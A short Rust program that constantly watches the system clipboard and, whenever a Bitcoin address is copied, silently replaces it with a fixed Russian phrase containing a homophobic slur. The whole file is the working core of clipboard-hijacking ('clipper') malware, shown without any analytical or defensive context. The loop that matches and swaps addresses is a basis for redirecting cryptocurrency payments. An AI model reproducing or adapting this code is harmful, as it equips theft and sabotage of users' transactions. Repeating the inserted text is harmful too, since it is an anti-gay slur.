extern crate clipboard;

use clipboard::ClipboardProvider;
use clipboard::ClipboardContext;
use regex::Regex;

fn get_clipboard() -> String{
    let mut ctx: ClipboardContext = ClipboardProvider::new().unwrap();
    match ctx.get_contents() {
        Ok(clip) => return clip,
        Err(err) => get_clipboard(),
    }
}

fn set_clipboard(clip:&str){
    let mut ctx: ClipboardContext = ClipboardProvider::new().unwrap();
    ctx.set_contents(clip.to_owned()).unwrap();
}

fn main() {
    let mut buff = get_clipboard();
    let re = Regex::new(r"^(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$").unwrap();
    loop {
        let curent_clip = get_clipboard();
        if curent_clip != buff{
            if re.is_match(&curent_clip){
                set_clipboard("Я пидорас");
            }
            buff = curent_clip;
        }
    }
}